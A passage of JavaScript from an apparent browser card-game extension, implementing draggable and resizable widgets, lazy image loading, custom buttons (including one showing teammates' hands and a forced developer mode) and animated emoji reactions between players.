                            } else if (translate[1] + element.offsetTop < 0) {
                                translate[1] = -element.offsetTop;
                            }
                            if (translate[0] + element.offsetLeft + element.offsetWidth > contains.offsetWidth) {
                                translate[0] = contains.offsetWidth - (element.offsetLeft + element.offsetWidth);
                            } else if (translate[0] + element.offsetLeft < 0) {
                                translate[0] = -element.offsetLeft;
                            }
                        }
                        if (!isImp)
                            element.style.transform = "translate3d(" + translate[0] + "px," + translate[1] + "px,0) scale(" + element._scale + ")";
                        else
                            element.style.setProperty('transform', "translate3d(" + translate[0] + "px," + translate[1] + "px,0) scale(" + element._scale + ")", 'important');
                    } else {
                        if (!XZ) {
                            if (iT + area[1] + element.offsetHeight > contains.offsetHeight) {
                                iT = contains.offsetHeight - (area[1] + element.offsetHeight);
                            } else if (iT + area[1] < 0) {
                                iT = -area[1];
                            }
                            if (iL + area[0] + element.offsetWidth > contains.offsetWidth) {
                                iL = contains.offsetWidth - (area[0] + element.offsetWidth);
                            } else if (iL + area[0] < 0) {
                                iL = -area[0];
                            }
                        }
                        if (!isImp)
                            element.css({
                                left: area[0] + iL + 'px',
                                top: area[1] + iT + 'px',
                            });
                        else
                            element.style.setProperty('left', area[0] + iL + 'px', 'important'), element.style.setProperty('top', area[1] + iT + 'px', 'important');
                    }
                };
            element._scale = 1,
                element.zooming = false,
                element.style.touchAction = "none";
            if (!element._translate) element._translate = [0, 0];
            if (isMobile) types = ['touchstart', "touchmove", 'touchend'];
            element['on' + types[0]] = event => {
                event.stopPropagation();
                if (element.classList.contains('dialog')) {
                    if (element.classList.contains('fixed') || element.classList.contains('popped')) return void 0;
                    if (event.target.finished) return void 0;
                    if (isMobile) if (event.touches.length <= 1) return undefined;
                } else if (event.target.finished || (element.content && element.content.contains(event.target))) return void 0;
                if (event.touches && event.touches[0]) event = event.touches[0];
                isTouch = true, area = [element.offsetLeft, element.offsetTop];
                disX = event.clientX / game.documentZoom;
                disY = event.clientY / game.documentZoom;
                document.addEventListener(types[1], windowmousemove, true);
                document.addEventListener(types[2], windowmouseup, true);
                element['on' + types[2]] = windowmouseup;
                element.dispatchEvent(new Event('zyile_move_Stat'));
            };
            var windowmousemove = function (event) {
                if (!isTouch) return false;
                event.preventDefault();
                event.stopPropagation();
                var event = event || window.event
                if (event.touches && event.touches[0]) event = event.touches[0], dragtouche = event;
                var iL = event.clientX / game.documentZoom - disX;
                var iT = event.clientY / game.documentZoom - disY;
                TranLeT(iT, iL);
                element.dispatchEvent(new Event('zyile_moving'));
                return false;
            };
            var windowmouseup = event => {
                if (!isTouch) return void 0;
                event.stopPropagation();
                event.preventDefault();
                document.removeEventListener(types[1], windowmousemove);
                document.removeEventListener(types[2], windowmouseup);
                element['on' + types[2]] = null;
                isTouch = false;
                if (dragtouche) event = dragtouche;
                var iL = event.clientX / game.documentZoom - disX;
                var iT = event.clientY / game.documentZoom - disY;
                TranLeT(iT, iL, true);
                dragtouche = null;
                var iiT = Math.abs(iL),
                    iiL = Math.abs(iT);
                if ((iiT < 10 && iiL < 10) || (isNaN(iiT) && isNaN(iiL))) element.dispatchEvent(new Event('endDang'));
                element.dispatchEvent(new Event('moveStop'));
            };
        };
    }

    window.qingyaoZoom = (function (element, options) {
        function _qingyaoZoom(element, options) {
            this.target = element
            this.options = Object.assign({
                limit: false,
                minWidth: 0,
                minHeight: 0
            }, options || {});

            this.onstart = 'mousedown';
            this.onmove = 'mousemove';
            this.onend = 'mouseup';
            if (window.isMobile) {
                this.onstart = 'touchstart'
                this.onmove = 'touchmove'
                this.onend = 'touchend'
            }
            this.init();
        }

        // 初始化
        _qingyaoZoom.prototype.init = function () {
            this.getBoundary()
            this.addHorn()
            this.addBorder()
            this.leftZoom()
            this.rightZoom()
            this.topZoom()
            this.bottomZoom()
            this.leftTopZoom()
            this.leftBottomZoom()
            this.rightTopZoom()
            this.rightBottomZoom()
        }
        // 获取父元素的宽高
        _qingyaoZoom.prototype.getBoundary = function () {
            this.maxWidth = this.target.parentNode.clientWidth
            this.maxHeight = this.target.parentNode.clientHeight
        }
        // 获取自身起始信息
        _qingyaoZoom.prototype.getInfo = function (e) {
            if (e.touches && e.touches[0]) e = e.touches[0];
            this.width = this.target.clientWidth
            this.height = this.target.clientHeight
            this.tx = this.target.offsetLeft;
            this.ty = this.target.offsetTop;
            this.startX = e.clientX;
            this.startY = e.clientY;
            this.distanceX = undefined;
            this.distanceY = undefined;
        }
        // 添加四个角
        _qingyaoZoom.prototype.addHorn = function () {
            this.leftTop = document.createElement("div")
            this.rightTop = document.createElement("div")
            this.leftBottom = document.createElement("div")
            this.rightBottom = document.createElement("div")
            this.leftTop.className = "qy-horn qy-leftTop"
            this.rightTop.className = "qy-horn qy-rightTop"
            this.leftBottom.className = "qy-horn qy-leftBottom"
            this.rightBottom.className = "qy-horn qy-rightBottom"
            this.target.append(this.leftTop)
            this.target.append(this.rightTop)
            this.target.append(this.leftBottom)
            this.target.append(this.rightBottom)
        }
        // 添加四条边
        _qingyaoZoom.prototype.addBorder = function () {
            this.left = document.createElement("div")
            this.right = document.createElement("div")
            this._top = document.createElement("div")
            this.bottom = document.createElement("div")
            this.left.className = "qy-vertical qy-left"
            this.right.className = "qy-vertical qy-right"
            this._top.className = "qy-horizontal qy-top"
            this.bottom.className = "qy-horizontal qy-bottom"
            this.target.append(this.left)
            this.target.append(this.right)
            this.target.append(this._top)
            this.target.append(this.bottom)
        }
        // 缩放实现
        _qingyaoZoom.prototype.zoom = function (el, direction) {
            el.addEventListener(this.onstart, (e) => {
                e.stopPropagation()
                this.getInfo(e);
                this.direction = direction;

                const windowmousemove = (e) => this.windowmousemove(e);
                const windowmouseup = event => {
                    event.preventDefault();
                    event.stopPropagation();
                    document.removeEventListener(this.onmove, windowmousemove, true);
                    document.removeEventListener(this.onend, windowmouseup, true);
                    this.target.dispatchEvent(new Event('zoomStop'));
                }

                document.addEventListener(this.onmove, windowmousemove, true);
                document.addEventListener(this.onend, windowmouseup, true);
            }, true);
        }
        // 放大的具体操作
        _qingyaoZoom.prototype.windowmousemove = function (e) {
            e.stopPropagation();
            // 判断手机的
            if (e.touches && e.touches[0]) e = e.touches[0];
            switch (this.direction) {
                case "left":
                    this.leftInfo(e);
                    break;
                case "right":
                    this.rightInfo(e);
                    break;
                case "top":
                    this.topInfo(e);
                    break;
                case "bottom":
                    this.bottomInfo(e);
                    break;
                case "leftTop":
                    this.leftTopInfo(e);
                    break;
                case "leftBottom":
                    this.leftBottomInfo(e);
                    break;
                case "rightTop":
                    this.rightTopInfo(e);
                    break;
                case "rightBottom":
                    this.rightBottomInfo(e);
                    break;
            }
            // 这里不能直接使用对this.newWidth隐式类型转换来判断，因为this.newWidth===0时，会使用this.width
            let width = this.newWidth !== undefined ? this.newWidth : this.width
            let height = this.newHeight !== undefined ? this.newHeight : this.height
            let translateX = this.distanceX !== undefined ? this.distanceX : this.tx
            let translateY = this.distanceY !== undefined ? this.distanceY : this.ty
            this.target.style.width = `${width}px`
            this.target.style.height = `${height}px`
            this.target.style.left = this.distanceX + 'px'
            this.target.style.top = this.distanceY + 'px'
            // this.target.style.transform = `translate(${translateX}px, ${translateY}px)`
            this.target.dispatchEvent(new Event('zoomMove'));
        };

        // 获取缩放时宽高、translate等参数的值
        _qingyaoZoom.prototype.leftInfo = function (e) {
            this.newWidth = this.width - (e.clientX / game.documentZoom - this.startX)

            this.distanceX = this.tx + (e.clientX / game.documentZoom - this.startX)
            if (this.options.limit) {
                this.newWidth = Math.max(this.options.minWidth, Math.min(this.newWidth, this.width + this.tx))
                this.distanceX = Math.max(0, Math.min(this.distanceX, this.width + this.tx - this.options.minWidth))
            }
        }
        _qingyaoZoom.prototype.rightInfo = function (e) {
            this.newWidth = this.width + (e.clientX - this.startX)
            if (this.options.limit) {
                this.newWidth = Math.max(this.options.minWidth, Math.min(this.newWidth, this.maxWidth - this.tx))
            }
        }
        _qingyaoZoom.prototype.topInfo = function (e) {
            this.newHeight = this.height - (e.clientY - this.startY)
            this.distanceY = this.ty + (e.clientY - this.startY)
            if (this.options.limit) {
                this.newHeight = Math.max(this.options.minHeight, Math.min(this.newHeight, this.height + this.ty))
                this.distanceY = Math.max(0, Math.min(this.distanceY, this.height + this.ty - this.options.minHeight))
            }
        }
        _qingyaoZoom.prototype.bottomInfo = function (e) {
            this.newHeight = this.height + (e.clientY - this.startY)
            if (this.options.limit) {
                this.newHeight = Math.max(this.options.minHeight, Math.min(this.newHeight, this.maxHeight - this.ty))
            }
        }
        _qingyaoZoom.prototype.leftTopInfo = function (e) {
            this.leftInfo(e)
            this.topInfo(e)
        }
        _qingyaoZoom.prototype.leftBottomInfo = function (e) {
            this.leftInfo(e)
            this.bottomInfo(e)
        }
        _qingyaoZoom.prototype.rightTopInfo = function (e) {
            this.rightInfo(e)
            this.topInfo(e)
        }
        _qingyaoZoom.prototype.rightBottomInfo = function (e) {
            this.rightInfo(e)
            this.bottomInfo(e)
        }
        _qingyaoZoom.prototype.leftZoom = function () {
            this.zoom(this.left, "left")
        }
        _qingyaoZoom.prototype.rightZoom = function () {
            this.zoom(this.right, "right")
        }
        _qingyaoZoom.prototype.topZoom = function () {
            this.zoom(this._top, "top")
        }
        _qingyaoZoom.prototype.bottomZoom = function () {
            this.zoom(this.bottom, "bottom")
        }
        _qingyaoZoom.prototype.leftTopZoom = function () {
            this.zoom(this.leftTop, "leftTop")
        }
        _qingyaoZoom.prototype.leftBottomZoom = function () {
            this.zoom(this.leftBottom, "leftBottom")
        }
        _qingyaoZoom.prototype.rightTopZoom = function () {
            this.zoom(this.rightTop, "rightTop")
        }
        _qingyaoZoom.prototype.rightBottomZoom = function () {
            this.zoom(this.rightBottom, "rightBottom")
        }
        return _qingyaoZoom;
    })();

    lib.createQyRadio = function (parentNode, selector, onchange) {
        let currentLabel = null
        selector.forEach(item => {
            let label = ui.create.node('label.qy-radio.is-bordered', parentNode);
            let radio__input = ui.create.node('span.qy-radio__input');
            let radio__inner = ui.create.node('span.qy-radio__inner');
            let radioInput = ui.create.node('input.qy-radio__original');
            label.appendChild(radio__input)
            radio__input.appendChild(radio__inner)
            radio__input.appendChild(radioInput)
            radioInput.type = 'radio';
            radioInput.autocomplete = "off";
            let radio__label = ui.create.node('span.qy-radio__label', item.label);
            label.appendChild(radio__label);
            label.__focus__ = function () {
                label.classList.add('is-checked', 'is-focus');
                radio__input.classList.add('is-checked');
            }
            label.__blur__ = function () {
                label.classList.remove('is-checked', 'is-focus');
                radio__input.classList.remove('is-checked');
            }
            radioInput.onclick = function () {
                if (this.checked) {
                    if (currentLabel !== label) {
                        if (currentLabel) {
                            currentLabel.__blur__();
                        }
                        currentLabel = label;
                        currentLabel.__focus__();
                        typeof onchange === 'function' && onchange.call(this, item.label)
                    }
                }
            }
            if (item.checked) {
                radioInput.checked = true;
                radioInput.onclick();
            }
        });
    }


    if (lib.qyUtils.getConfig('qingyaoLoadImageOptimization', false)
        && (!lib.config.extensions.includes('太虚幻境') && !lib.config.extension_太虚环境_enable)) {
        lib.qyArenaReadyPushOrRunStart(() => {
            if (ui.window) {
                ui.window.classList.add('qingyaoLoadImageOptimization');
            }
        });
        // 配置观察元素的参数
        const options = {
            root: null,
            rootMargin: "0px",
            threshold: 0.1
        };

        // 监听元素是否进入可视区
        function onIntersection(entries) {
            entries.forEach(entry => {
                if (entry.intersectionRatio <= 0) return;
                const target = entry.target;
                if (!target._intersectionObserver) return;

                // 停止观察元素
                target._intersectionObserver.unobserve(target);

                // 加载图片
                target.style.backgroundImage = `url("${target._loadSrc}")`;

                // 清除相关属性
                delete target._intersectionObserver;
                delete target._loadSrc;
            });
        }

        /** 懒加载武将图片 **/
        const originSetBackgroundImage = HTMLDivElement.prototype.setBackgroundImage;
        HTMLDivElement.prototype.setBackgroundImage = function (imgUrl) {
            // 卡牌经常丢失图片，不优化了
            if (imgUrl.includes('card')) {
                return originSetBackgroundImage.call(this, imgUrl);
            }
            if (this._intersectionObserver) {
                this._intersectionObserver.unobserve(this);
                delete this._intersectionObserver
            }
            // 记录图片链接
            this._loadSrc = `${lib.assetURL}${imgUrl}`;

            // 添加交叉观察器
            const observer = new IntersectionObserver(onIntersection, options);
            this._intersectionObserver = observer;
            observer.observe(this);
        }
    }


    // 强制开启开发者模式
    lib.cheat.i();

    // innerHTML 以html标签渲染
    // css css的属性
    // fixed 是否固定不可移动
    // endDang 点击按钮后没有移动（移动的距离与原位置较小）触发的事件
    // moveStop 每次移动所触发的事件
    // class 哪些class
    // memory 移动位置所保存的key
    // CustomName 自定义的ui[CustomName]
    // parent 父元素
    CustomButtons.addArray([
        // 界 按钮
        {
            innerHTML: '界',
            css: {
                left: '750px',
                top: '370px',
                transition: 'none',
                zIndex: 9,
            },
            fixed: false,
            endDang: function (event) {
                event.stopPropagation();
                lib.cheat.i();

                window.cheat = lib.cheat;
                window.game = game;
                window.ui = ui;
                window.get = get;
                window.ai = ai;
                window.lib = lib;
                window._status = _status;
                window.qyCachesMainWindow.show();
            },
            moveStop: function (event) {
                event.stopPropagation();
                var translate = this._translate.slice(0);
                lib.config.QyFrameButtonPosition = translate;
                game.saveConfig('QyFrameButtonPosition', translate);
            },
            memory: 'QyFrameButtonPosition',
            CustomName: 'QyFrameButton',
            class: '.menubutton.round.highlight.hidden',
        },
        //队友手牌
        {
            css: {
                left: '750px',
                top: '370px',
                transition: 'none',
                zIndex: 9,
            },
            endDang: function (event) {
                event.stopPropagation();
                if (!game.me || !_status.gameDrawed) return false;
                var container = ui.create.div('.popup-container', ui.window, function () {
                    dialog.close();
                    this.delete();
                });
                var dialog = ui.create.dialog('队友手牌');
                container.appendChild(dialog);
                var getFriends = game.me.getFriends();
                // 如果是国战模式，并且自己的势力是野心玩家，那就只能看自己的手牌
                if (get.mode() === 'guozhan' && game.me.identity === 'ye')
                    getFriends = [game.me];
                getFriends.map(player => {
                    var cards = player.getCards('h');
                    dialog.addText(`${get.translation(player.name1)}的手牌`, true);
                    dialog.addSmall([cards, 'vcard'])
                });
            },
            moveStop: function (event) {
                event.stopPropagation();
                var translate = this._translate.slice(0);
                lib.config.QyTeammateHandPosition = translate;
                game.saveConfig('QyTeammateHandPosition', translate);
            },
            memory: 'QyTeammateHandPosition',
            CustomName: 'QYTeammateHand',
            fixed: false,
            class: '.qyFriendsCards.hidden',
        },
        /*{
            innerHTML: '假',
            css: {
                left: '750px',
                top: '370px',
                transition: 'none',
                zIndex: 10,
            },
            fixed: false,
            Tran: true,
            endDang: function (event) {
                event.stopPropagation();
                let divs = this.divs;
                if(this.clicked) return ;
                this.clicked = true;
                setTimeout(()=>{
                    this.clicked = false;
                },400);
                let domRect = this.getBoundingClientRect();

                if (this.isOpen) {
                    this.style.transform = 'rotate(0)'
                    for (var i = 0; i < divs.length; i++) {
                        divs[i].style.transform = 'rotate(0) scale(1)'
                        divs[i].style.transition = '0.6s ' + (1 - i / divs.length)*.5 + 's'
                        divs[i].style.left = domRect.x + 'px'
                        divs[i].style.top = domRect.y + 'px';
                        divs[i].delete(1000);
                    }
                    return this.isOpen = !this.isOpen;
                }

                //计算菜单旋转出去的坐标
                const getLocation = function (r, deg) {
                    var x = Math.round(r * Math.sin(deg))
                    var y = Math.round(r * Math.cos(deg))
                    return {left: x, top: y}
                }

                let buttons = window.qyCachesMainWindow.buttons;
                if (buttons.length > 0) {
                    buttons.forEach(options => {
                        var value = Object.assign({
                            innerHTML: '',
                            css: {
                                left: domRect.x + 'px',
                                top: domRect.y + 'px',
                            },
                            parent: ui.window,
                            click: function (event) {
                                event.stopPropagation();
                            },
                            class: '',
                        }, options);
                        let divElement = ui.create.div(value.class, value.css, value.innerHTML, value.parent, value.click);
                        divs.push(divElement);
                        typeof value.after === 'function' && requestAnimationFrame(value.after.bind(divElement));
                    });
                    this.style.transform = 'rotate(-720deg) scale(1)'
                    for (let i = 0; i < divs.length; i++) {
                        divs[i].style.transition = '0.6s ease ' + (i / divs.length)*.5 + 's'
                        ui.refresh(divs[i]);
                        divs[i].style.transform = 'rotate(-720deg) scale(1)'
                        divs[i].style.left = domRect.x + getLocation(60, (4 + i) * 60 / 180 * Math.PI).left + 'px'
                        divs[i].style.top = domRect.y + getLocation(60, (4 + i) * 60 / 180 * Math.PI).top + 'px'
                    }
                }
                this.isOpen = !this.isOpen;
            },
            moveStop: function (event) {
                event.stopPropagation();
                var translate = this._translate.slice(0);
                lib.config.QyFrameButtonPosition = translate;
                game.saveConfig('QyFrameButtonPosition', translate);
            },
            memory: 'QyHomeElement',
            CustomName: 'QyHomeElementButton',
            class: '.menubutton.round.highlight.hidden',
            after: function () {
                this.isOpen = false;
                this.divs = [];
            },
        },*/
    ]);

    if (config.qingyao_cundang === 'button') {
        CustomButtons.push({
            innerHTML: '复',
            css: {
                left: '750px',
                top: '370px',
                transition: 'none',
                zIndex: 9,
            },
            endDang: function (event) {
                event.stopPropagation();
                if (lib.skill._ymfuyuan.filter(_status.event, game.me)) {
                    let next = game.createEvent("ymfuyuan", false);
                    next.player = game.me;
                    next.setContent(lib.skill._ymfuyuan.content);
                    _status.paused = false;
                    game.loop();
                }
            },
            moveStop: function (event) {
                event.stopPropagation();
                var translate = this._translate.slice(0);
                lib.config.qyCunDangPosition = translate;
                game.saveConfig('qyCunDangPosition', translate);
            },
            memory: 'qyCunDangPosition',
            CustomName: 'qyCunDang',
            fixed: false,
            class: '.menubutton.round.highlight',
        })
    }

    CustomButtons.forEach(options => {
        var value = Object.assign({
            innerHTML: '',
            css: {},
            parent: document.body,
            fixed: true,
            endDang: function (event) {
            },
            moveStop: function (event) {
            },
            Tran: false,
            CustomName: 'QY' + Math.random().toString(16).slice(2),
            class: '',
        }, options);
        ui[value.CustomName] = ui.create.div(value.class, value.css, value.innerHTML, value.parent);
        var div = ui[value.CustomName];
        if (value.memory) {
            //移动到指定位置
            var translate = lib.config[value.memory] || [0, 0];
            div._translate = translate;
            div.style.transform = "translate(" + translate[0] + "px," + translate[1] + "px)";
        }
        if (!value.fixed) {
            //触发打开打开界面
            div.addEventListener('endDang', value.endDang, true);

            //保存按钮位置
            div.addEventListener('moveStop', value.moveStop, true);

            window.zyile_dragZoom(div, value.parent, value.Tran);
        }
        if (typeof value.after === 'function') {
            requestAnimationFrame(value.after.bind(div));
        }
    });

    if (game.getExtensionConfig('假装无敌', 'qingyao_mvp_flower_egg_shoe')) {
        const spine = {
            'egg': 'Ss_BiaoQing_huiqi',
            'wine': 'Ss_BiaoQing_PengBei',
            'flower': 'flower',
            'goldenFlower': 'Ss_DaoJu_jinsexianhua',
            'shoe': 'Ss_BiaoQing_TuoXie',
            'giveUpStatus': '1002',
        }
        const spineHandle = {
            // 臭鸡蛋
            'Ss_BiaoQing_huiqi': (target, player) => {
                return new Promise(resolve => {
                    lib.qyWorkerSpine({
                        name: 'emoji/臭鸡蛋/Ss_BiaoQing_huiqi',
                        parent: player,
                        action: 'play3',
                        actions: ['play4', 'play2'],
                        autoDestroy: false,
                        targetRect: target,
                        loop: true,
                        skeScale: 0.6,
                        onLoad: function () {
                            const getRandomFloor = function (min, max) {
                                return Math.floor(Math.random() * (max - min)) + min
                            }
                            const width$ = this.position.targetRect.width;
                            const height$ = this.position.targetRect.height;
                            this.position.targetRect.width = getRandomFloor(width$ / 2, width$ + width$ / 2);
                            this.position.targetRect.height = getRandomFloor(height$ / 2, height$ + height$ / 2);
                            setTimeout(() => postMessageValue(this.id, this.position.qyWorkerAction, 'audio', null), 260);
                            this.moveToRect(this.position.targetRect, 300, function () {
                                this.changeAnimation(this.position.actions.randomGet(), false);
                                setTimeout(() => {
                                    postMessageValue(this.id, this.position.qyWorkerAction, 'completed', null);
                                    this.destroySpine();
                                }, 500);
                            })
                        },
                    }, null, {
                        completed: {
                            once: true,
                            fn: () => {
                                resolve('completed');
                            },
                        },
                        audio: {
                            once: true,
                            fn: () => {
                                game.qyAudioPlay('audio', 'Egg01.mp3');
                            },
                        },
                    });
                });
            },
            // 酒杯🍷
            'Ss_BiaoQing_PengBei': (target, player) => {
                game.qyAudioPlay('audio', 'ganbeiqingzhu.mp3');
                return new Promise(resolve => {
                    // 酒杯
                    lib.qyWorkerSpine({
                        name: 'emoji/玫瑰酒杯/Ss_BiaoQing_PengBei',
                        action: 'play2',
                        parent: target,
                        skeScale: 0.6,
                    }, null, (data, error) => {
                        resolve(data);
                    });
                    // 玫瑰
                    lib.qyWorkerSpine({
                        name: 'emoji/玫瑰酒杯/Ss_BiaoQing_PengBei_meigui',
                        parent: target,
                        skeScale: 0.5,
                        skeX: [10],
                        spine_delay: 1640
                    });
                });
            },
            // 金花
            'Ss_DaoJu_jinsexianhua': (target, player) => {
                game.playAudio('audio', `Flowers0${get.rand(1, 2)}.mp3`);
                return new Promise(resolve => {
                    lib.qyWorkerSpine({
                        name: 'Ss_DaoJu_jinsexianhua',
                        parent: player,
                        autoDestroy: true,
                        skeScale: 0.6,
                        loopCount: 2,
                        targetRect: target,
                        onLoad: function () {
                            const getRandomFloor = function (min, max) {
                                return Math.floor(Math.random() * (max - min)) + min
                            }
                            const width$ = this.position.targetRect.width;
                            const height$ = this.position.targetRect.height;
                            this.position.targetRect.width = getRandomFloor(width$ / 2, width$ + width$ / 2);
                            this.position.targetRect.height = getRandomFloor(height$ / 2, height$ + height$ / 2);

                            this.moveToRect(this.position.targetRect, 300, function () {
                                this.changeAnimation('play2', false);
                            })
                        },
                        destroy() {
                            postMessageValue(this.id, this.position.qyWorkerAction, 'completed', null);
                        },
                    });
                }, null, {
                    completed: {
                        once: true,
                        fn: () => {
                            resolve('completed');
                        },
                    },
                });
            },
            // 花
            'flower': (target, player) => {
                const playAnimation = (name, target, player, angle, playTime, callback) => {
                    lib.qyWorkerLine({
                        name: name,
                        angle: angle,
                        start: target,
                        end: target,
                        playType: 2,
                        playTime: playTime,
                    }, callback);
                };

                const playFlowerAnimation = (target, player, callback) => {
                    const { angleDegrees } = qyAnimationUtil.calculateAngleAndDistance(player, target);
                    const angle = angleDegrees - 90;
                    lib.qyWorkerLine({
                        name: 'emoji/玫瑰花/flower_fly',
                        angle: angle,
                        start: player,
                        scale: 0.6,
                        end: target,
                        playType: 2,
                        playTime: 500,
                    }, (data, error) => {
                        playAnimation('emoji/玫瑰花/flower0', target, target, 180, 30, () => {
                            playAnimation('emoji/玫瑰花/flower1', target, target, 180, 30, () => {
                                playAnimation('emoji/玫瑰花/flower2', target, target, 180, 100, callback);
                            });
                        });
                    });
                };
                return new Promise(resolve => {
                    playFlowerAnimation(target, player, (data, error) => resolve(data));
                });
            },
            // 拖鞋
            'Ss_BiaoQing_TuoXie': (target, player) => {
                game.qyAudioPlay('audio', 'Tuoxie1.mp3');
                return new Promise(resolve => {
                    lib.qyWorkerLine({
                        name: 'emoji/拖鞋/tuoxie',
                        start: player,
                        scale: 0.6,
                        end: target,
                        playType: 2,
                        rotation: 180 * 8 - 90,
                        playTime: 1510,
                        zIndex: 99,
                        onLoad: function () {
                            this.scaleSprite({ scale: 0.1 });
                            this.ease(this, {
                                scale: 0.6
                            }, 1500);
                        },
                    }, (data, error) => {
                        lib.qyWorkerSpine({
                            name: 'Ss_BiaoQing_TuoXie',
                            skeScale: 0.7,
                            parent: target,
                        });
                        game.qyAudioPlay('audio', 'Tuoxie2.mp3');
                        resolve(data);
                    });
                    lib.qyWorkerLine({
                        name: 'emoji/拖鞋/tuoxie2',
                        start: player,
                        scale: 0.6,
                        end: target,
                        playType: 2,
                        rotation: 180 * 8 - 90,
                        playTime: 1510,
                        alpha: 0.6,
                        spine_delay: 100,
                        onLoad: function () {
                            this.scaleSprite({ scale: 0.1 });
                            this.ease(this, {
                                scale: 0.6
                            }, 1500);
                        },
                    });
                    lib.qyWorkerLine({
                        name: 'emoji/拖鞋/tuoxie2',
                        start: player,
                        scale: 0.6,
                        end: target,
                        playType: 2,
                        rotation: 180 * 8 - 90,
                        playTime: 1510,
                        alpha: 0.2,
                        spine_delay: 200,
                        onLoad: function () {
                            this.scaleSprite({ scale: 0.1 });
                            this.ease(this, {
                                scale: 0.6
                            }, 1500);
                        },
                    });
                });
            },
            // 摆烂
            '1002': (target, player) => {
                return new Promise(resolve => {
                    lib.qyWorkerSpine({
                        name: 'emoji/emoji/1002',
                        parent: target,
                        skeScale: 0.8,
                        skeY: [-20],
                    }, null, data => {
                        resolve(data);
                    });
                });
            },
        }

        const spineInvoke = function (player, target, spineLink) {
            const spineElement = spine[spineLink];
            if (!spineElement) return Promise.reject(`${spineLink} 不存在`)
            const spineHandleElement = spineHandle[spineElement];
            if (!spineHandleElement) return Promise.reject(`${spineElement} spine函数不存在`);
            return spineHandleElement(target, player);
        }
        const baohusanMap = new Map();
        _status.qyBaohusan = [];
        // 表情互动
        lib.element.player.throwSpineEmotion = function (target, emotion, num) {
            let playerRect, targetRect = qyAnimationUtil.rect2JSON(target.getBoundingClientRect());
            if (this === game.me) {
                const x = ui.window.clientWidth / 2;
                const y = ui.me.getBoundingClientRect().y;
                playerRect = {
                    width: 0,
                    height: 0,
                    left: x,
                    top: y,
                    x,
                    y
                }
            } else {
                playerRect = qyAnimationUtil.rect2JSON(this.getBoundingClientRect());
            }

            if (!qyAnimationUtil.isCorrectNumber(num) || num < 1) {
                num = 1;
            } else {
                num = parseFloat(num);
            }

            // 新手保护伞
            if (_status.qyBaohusan.includes(target) && emotion === 'egg') {
                if (baohusanMap.has(target)) {
                    const { baohusan, num: numx } = baohusanMap.get(target);
                    baohusanMap.set(target, { baohusan, num: numx + num });
                } else {
                    const baohusan = qyAnimationUtil.generatorUUID();
                    baohusanMap.set(target, { baohusan, num });
                    // 保护伞
                    lib.qyWorkerSpine({
                        uuid: baohusan,
                        name: 'emoji/protectedEggShoe/Ss_BiaoQing_XinShou',
                        loopCount: 2,
                        parent: target,
                        event: {
                            end: function () {
                                this.changeAnimation('play2', false);
                            },
                        },
                    });
                    // 保护伞特效
                    lib.qyWorkerSpine({
                        name: 'emoji/protectedEggShoe/Ss_BiaoQing_XinShou_2',
                        parent: target,
                        spine_delay: 100,
                    });
                }
            }


            for (let i = 0; i < num; i++) {
                setTimeout(() => {
                    spineInvoke(playerRect, targetRect, emotion).then(val => {
                        if (!baohusanMap.has(target)) return;
                        const { baohusan, num } = baohusanMap.get(target);
                        const numx = num - 1;
                        if (numx > 0) {
                            baohusanMap.set(target, { baohusan, num: numx });
                        } else {
                            lib.qyWorkerUpdateSpine({
                                uuid: baohusan,
                                action: 'play3',
                            });
                            baohusanMap.delete(target);
                        }
                    });
                }, 100 * i);
            }
            // 追加拖鞋啥的
            let link = null, timing;
            if (emotion === 'egg') {
                link = 'shoe';
                timing = ++num * 100
            } else if (emotion === 'flower') {
                link = 'wine';
                timing = ++num * 100 + 500
            }
            if (link && num >= 10) {
                setTimeout(() => {
                    spineInvoke(playerRect, targetRect, link);
                }, timing)
            }
            // 对方随机反击，可能会连续反击         如果是新手保护玩家，80%概率反击（反正我有保护伞）
            if ((Math.random() < 0.45 || (_status.qyBaohusan.includes(this)) && Math.random() < 0.65) && target !== this ) {
                let random = get.rand(1, num);
                num += 10;
                setTimeout(() => {
                    target.throwSpineEmotion(this, emotion, random);
                }, ++num * 100)
            }
        }
        const skills = {
            // 保护伞
            _qyBaohusanPush: {
                trigger: {
                    global: 'gameStart',
                },
                filter(event, player) {
                    return game.me === player;
                },
                fixed: true,
                direct: true,
                content: function () {
                    game.players.forEach(current => {
                        let probability = 20
                        if (current === game.me) {
                            probability += 30
                        }
                        const random = Math.floor(Math.random() * 100);
                        if (random < probability) {
                            _status.qyBaohusan.add(current);
                            game.log(current, '是新手，请友善对待哦');
                        }
                    });
                },
            },
            // 造成濒死扔鸡蛋
            _qyDyingEgg: {
                trigger: {
                    player: 'dying'
                },
                fixed: true,
                direct: true,
                filter: function (event, player) {
                    return event.source && event.source !== player && Math.random() <= 0.9
                },
                content: function () {
                    player.throwSpineEmotion(trigger.source, 'egg', get.rand(1, 15));
                },
            },
            // 向牌多的队友扔花
            _qyPhaseUseBeginFlower: {
                trigger: {
                    player: 'phaseUseBegin',
                },
                fixed: true,
                direct: true,
                filter: function (event, player) {
                    return player.countCards('hs') > 10;
                },
                content: function () {
                    game.me.getFriends(true).forEach(item => {
                        if (item == game.me) return;
                        if (Math.floor(Math.random() * 100) > 95) return;
                        item.throwSpineEmotion(player, 'flower', get.rand(1, 15));
                    });
                },
            },
            // 队友向player扔花，敌人向player扔鸡蛋
            _qyDrawEndFlowerOrEgg: {
                trigger: {
                    player: 'drawEnd',
                },
                fixed: true,
                direct: true,
                filter: function (event, player) {
                    const drawLength = player.getHistory('draw')?.length ?? 0;
                    return drawLength !== 0 && drawLength % 5 == 0;
                },
                content: function () {
                    // 队友扔花
                    player.getFriends(true).forEach(item => {
                        if (item == game.me) return;
                        if (Math.floor(Math.random() * 100) > 60) return;
                        item.throwSpineEmotion(player, 'flower', get.rand(1, 15));
                    });
                    // 敌人扔鸡蛋
                    for (let enemy of player.getEnemies()) {
                        if (Math.floor(Math.random() * 10) > 8) continue;
                        enemy.throwSpineEmotion(player, 'egg', get.rand(1, 15));
                    }
                },
            },
            // 受到伤害后往伤害来源扔鸡蛋
            _qyDamageEndEgg: {
                trigger: {
                    player: 'damageEnd'
                },
                filter: function (event, player) {
                    return event.num > 1 && event.source && event.source !== player
                },
                fixed: true,
                direct: true,
                content: function () {
                    const probability = 80 + trigger.num * 5;
                    if (Math.floor(Math.random() * 100) <= probability) {
                        player.throwSpineEmotion(trigger.source, 'egg', get.rand(1, 15));
                    }
                },
            },
            // 从濒死中恢复过来
            _qyRecoverEndFlowerOrEgg: {
                trigger: {
                    player: 'recoverEnd'
                },
                filter: function (event, player) {
                    return event.getParent('dying', true) !== null && event.source && event.source !== player;
                },
                fixed: true,
                direct: true,
